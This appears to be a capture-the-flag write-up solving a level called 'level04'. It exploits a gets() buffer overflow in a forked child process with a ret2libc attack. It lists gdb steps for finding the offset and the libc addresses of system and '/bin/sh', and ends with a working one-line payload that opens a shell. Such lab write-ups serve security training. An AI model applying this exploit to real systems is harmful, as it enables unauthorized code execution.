when we decompile the program, we see a fork() function that split the execution into a parent and a child processes
we also see an unsecured gets function call into the child process, that is vulnerable to a buffer overflow exploit
we have to use the command "set follow-fork-mode child" in gdb to be able to debug the child process

156 is the offset to override eip (found with the buffer overflow pattern generator)
the problem is, when executing a shellcode with the system call execve, the child process is killed, so we will use a ret2libc attack

first, let's find the system address with "p system" -> 0xf7e6aed0

then, we need the address of the "/bin/sh" string to insert it as a parameter of the system function
we type "info proc map" to check the start address of the libc (/lib32/libc-2.15.so) -> 0xf7e2c000
now, the command "strings -a -t x /lib32/libc-2.15.so | grep 'bin/sh'" allow us to find the offset of the string /bin/sh -> 15d7ec
finally, when we add the offset to the start address (0xf7e2c000 + 15d7ec) we found the address we look for -> 0xf7f897ec

(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"' ; cat) | ./level04
